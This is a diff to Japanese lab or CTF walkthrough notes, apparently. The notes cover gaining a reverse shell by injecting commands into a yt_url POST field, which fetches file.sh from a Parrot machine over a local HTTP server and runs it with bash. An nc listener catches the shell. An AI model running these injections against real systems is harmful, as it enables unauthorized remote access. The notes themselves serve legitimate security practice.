@@ -26,8 +26,10 @@
   - ポートが2つ出てくるので、整理しておくと、reverse-shellのポートは9001を使う。Parrotからターゲットにfile.shを送るポートには8000を使う
 - reverse-shellで侵入(実行)
   - Parrotでvimでfile.shを作る`import socket,subprocess~`を貼り付ける。コードの中のポートは9001にしておく
+  - Parrotでfile.shを送るため待ち受ける
+    - `python -m http.server 8000`  
   - ターゲット側からParrotの8000ポートを利用してfile.shを取得する。リクエストのボディ部分のyt_url=のところに`` --exec%3c`wget${IFS}http://192.168.56.101:8000/file.sh` ``を入力して、これ以外の余計な部分は削除する。sendボタンを押す。
-  - parrotで待ち受ける
+  - parrotでreverse-shellを待ち受ける
     - `nc -nlvp 9001` 
   - postのボディ部分のyt_url=のところに`` --exec%3c`bash${IFS}file.sh` ``を入力して、sendボタンを押すとシェルが使える
 
